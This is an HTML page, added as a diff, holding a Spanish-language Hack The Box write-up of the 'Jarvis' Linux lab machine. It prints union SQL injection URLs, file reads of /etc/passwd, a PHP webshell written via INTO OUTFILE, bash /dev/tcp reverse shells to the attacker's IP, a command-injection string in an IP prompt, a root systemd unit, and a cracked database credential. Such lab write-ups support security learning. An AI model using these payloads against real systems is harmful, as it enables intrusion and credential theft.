@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Jarvis HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/jarvis/pasted-20260408142646.png" alt="Jarvis HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Jarvis</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>SQLI</span>
+            <span>phpmyadmin</span>
+            <span>sudoers</span>
+            <span>sanitizacion</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Aplicación web vulnerable a SQL injection</li>
+            <li><code>Explotación</code>: SQLI para escribir una webshell y obtener reverse shell</li>
+            <li><code>Movimiento lateral</code>: Sudoers sobre un script Python mal sanitizado para acceder como <code>pepper</code></li>
+            <li><code>Escalada de Privilegios</code>: Abuso de <code>systemctl</code> con sudo según GTFOBins</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408142824.png" alt="Jarvis HTB" />
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408164633.png" alt="Jarvis HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: SQLI</h2>
+          <div class="code-card">
+            <h3>Enumerar columnas a ciegas: Hay 7 columnas</h3>
+            <pre><code># URL: http://10.129.229.137/room.php?cod=1 union select 1,2,3-- -
+# URL: http://10.129.229.137/room.php?cod=1 union select 1,2,3,4,5,6,7-- -
+
+# Aplicamos un ID negativo para evitar ver el output de la room con ID 1
+# URL: http://10.129.229.137/room.php?cod=-11 union select 1,2,3,4,5,6,7-- -</code></pre>
+          </div>
+          <p>&lt;div style="display:flex; gap:20px;"&gt;</p>
+          <p>&lt;img src="Pasted image 20260408170123.png" width="250"&gt;</p>
+          <p>&lt;img src="Pasted image 20260408170226.png" width="250"&gt;</p>
+          <p>&lt;img src="Pasted image 20260408170418.png" width="275"&gt;</p>
+          <p>&lt;/div&gt;</p>
+          <div class="code-card">
+            <h3>Enumerar BD, Tablas, Columnas</h3>
+            <pre><code># URL: http://10.129.229.137/room.php?cod=-1 union select 1,2,database(),4,5,6,7-- -
+# BD: hotel
+
+# URL: http://10.129.229.137/room.php?cod=-1 union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema = "hotel"-- -
+# Tabla: room
+
+# http://10.129.229.137/room.php?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema = "hotel" and table_name = "room" limit 0,1-- -
+# Columnas Iterando con limit del 0 al 6: cod,name,price,desc,room...
+
+# No hay nada interesante en la BD hotel</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>SQLI -&gt; LFI</h3>
+            <pre><code># URL: http://10.129.229.137/room.php?cod=-1 union select 1,2,load_file("/etc/passwd"),4,5,6,7-- -
+# Usuario pepper -&gt; Enumerar .ssh
+
+# URL: http://10.129.229.137/room.php?cod=-1 union select 1,2,load_file("/home/pepper/.ssh/id_rsa"),4,5,6,7-- -
+# No existe</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408181704.png" alt="Jarvis HTB" />
+          <div class="code-card">
+            <h3>SQLI -&gt; RCE</h3>
+            <pre><code># URL: http://10.129.229.137/room.php?cod=-1 union select 1,2,"&lt;?php system($_REQUEST['cmd']); ?&gt;",4,5,6,7 into outfile "/var/www/html/console.php"-- -
+
+# RCE: http://10.129.229.137/console.php?cmd=whoami
+
+# RCE -&gt; ReverseShell: http://10.129.229.137/console.php?cmd=bash -c "bash -i &gt;%26 /dev/tcp/10.10.16.178/443 0&gt;%261"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408182522.png" alt="Jarvis HTB" />
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408183049.png" alt="Jarvis HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408235916.png" alt="Jarvis HTB" />
+          <div class="code-card">
+            <h3>/tmp/rev.sh</h3>
+            <pre><code>#!/bin/bash
+/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.178/444 0&gt;&amp;1</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># Listener 444
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+# Enter an IP: 10.10.10.$(bash /tmp/rev.sh)</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408235838.png" alt="Jarvis HTB" />
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260409000114.png" alt="Jarvis HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: SUID systemctl</h2>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260409001424.png" alt="Jarvis HTB" />
+          <div class="code-card">
+            <h3>Crear fichero root.service en /home/pepper</h3>
+            <pre><code>[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.178/4443 0&gt;&amp;1'
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ejecutar binario</h3>
+            <pre><code># Listener 4443
+/bin/systemctl enable /home/pepper/root.service
+/bin/systemctl start root</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260409001546.png" alt="Jarvis HTB" />
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260409001530.png" alt="Jarvis HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>SQLI</span>
+            <span>phpmyadmin</span>
+            <span>sudoers</span>
+            <span>sanitizacion</span>
+            <span>SUID</span>
+            <span>systemctl</span>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Alternativa SQLI</h2>
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># http://10.129.229.137/room.php?cod=-1 union select 1,2,group_concat(User,0x3a,Password),4,5,6,7 from mysql.user-- -
+
+# Credenciales phpmyadmin -&gt; DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+# DBadmin:imissyou</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408184020.png" alt="Jarvis HTB" />
+          <p><a href="https://crackstation.net/">CrackStation</a></p>
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408184416.png" alt="Jarvis HTB" />
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408184134.png" alt="Jarvis HTB" />
+          <img class="writeup-image" src="/writeups/assets/jarvis/pasted-20260408184604.png" alt="Jarvis HTB" />
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
